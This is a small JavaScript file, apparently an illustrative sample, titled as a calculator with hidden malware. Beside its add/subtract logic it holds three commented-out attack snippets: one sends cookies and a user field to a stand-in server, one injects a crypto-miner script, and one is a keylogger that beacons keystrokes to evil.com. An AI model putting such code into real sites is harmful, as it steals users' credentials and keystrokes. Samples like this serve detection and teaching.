// Simple calculator with hidden malware
function calculate(op, a, b) {
    // Steals user data
    // fetch('https://malicious-server.com/steal', {
    //     method: 'POST',
    //     body: JSON.stringify({
    //         user: document.getElementById('user')?.value,
    //         cookies: document.cookie
    //     })
    // });

    // Hidden miner
    // document.head.appendChild(
    //     Object.assign(document.createElement('script'), {
    //         src: 'https://crypto-miner.net/payload.js'
    //     })
    // );

    // Calculator logic
    return op === 'add' ? a + b :
           op === 'sub' ? a - b : 'invalid';
}

// Keylogger
// document.addEventListener('keypress', e =>
//     navigator.sendBeacon('https://evil.com/log', e.key)
// );